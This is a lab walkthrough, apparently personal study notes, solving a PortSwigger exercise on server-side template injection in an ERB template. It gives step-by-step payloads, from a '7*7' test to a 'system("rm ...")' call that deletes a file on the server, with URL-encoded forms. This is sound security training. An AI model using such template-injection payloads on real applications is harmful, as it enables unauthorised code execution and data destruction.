
# #PortSwigger 


![[Pasted image 20251214005018.png]]


## Lab Description

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

**Objective:** Execute arbitrary code to delete the `morale.txt` file from Carlos's home directory.

---
----


### Step 1: Identify the Injection Point

1. In Burp's browser, access the lab
2. Click on a product to view details
3. Observe the `message` parameter in the URL:
```
https://YOUR-LAB-ID.web-security-academy.net/?message=Unfortunately+this+product+is+out+of+stock
```

The `message` parameter is rendered directly on the page.

----

### Step 2: Confirm Template Injection

**Test payload (mathematical expression):**
```
<%= 7*7 %>
```

**URL-encoded payload:**
```
<%25%3d+7*7+%25>
```

**Full URL:**
```
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25%3d+7*7+%25>
```

**Result:** The number `49` appears on the page instead of the message.
![[Pasted image 20251214005416.png]]

Template injection confirmed!


---


*Checking Payload*
![[Pasted image 20251214005445.png]]

*Checking Payload*
![[Pasted image 20251214005504.png]]

*Checking Payload*
![[Pasted image 20251214005546.png]]


### Step 3: Execute System Command

**Payload to delete the file:**
```
<%= system("rm /home/carlos/morale.txt") %>
```

**URL-encoded payload:**
```
<%25+system("rm+/home/carlos/morale.txt")+%25>
```

**Full URL:**
```
https://YOUR-LAB-ID.web-security-academy.net/?message=<%25+system("rm+/home/carlos/morale.txt")+%25>
```

---

### Step 4: Send the Request

1. Load the URL in Burp's browser
2. The command executes in the background
3. The file `/home/carlos/morale.txt` is deleted

---

### Step 5: Lab Solved

![[Pasted image 20251214005637.png]]


---
---

